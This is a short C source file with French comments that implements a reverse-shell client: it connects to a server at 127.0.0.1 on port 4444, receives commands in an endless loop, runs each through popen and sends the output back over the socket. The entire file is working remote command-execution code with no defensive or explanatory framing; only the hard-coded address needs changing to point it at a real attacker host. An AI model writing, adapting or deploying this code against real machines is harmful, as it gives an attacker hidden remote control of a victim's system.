#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define SERVER_IP "127.0.0.1"
#define PORT 4444
#define BUFFER_SIZE 1024

void execute_command(char *command, char *result, int result_size) {
    FILE *fp;
    fp = popen(command, "r");  // Exécuter la commande et récupérer la sortie
    if (fp == NULL) {
        snprintf(result, result_size, "Erreur d'exécution\n");
        return;
    }

    fread(result, 1, result_size, fp);
    pclose(fp);
}

int LaunchClient() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE], result[BUFFER_SIZE];

    // Création du socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Erreur socket");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        perror("Erreur connect");
        close(sock);
        exit(1);
    }

    printf("Connecté au serveur !\n");

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        recv(sock, buffer, BUFFER_SIZE, 0);

        printf("Commande reçue : %s\n", buffer);

        memset(result, 0, BUFFER_SIZE);
        execute_command(buffer, result, BUFFER_SIZE);

        send(sock, result, strlen(result), 0);
    }

    close(sock);
    return 0;
}
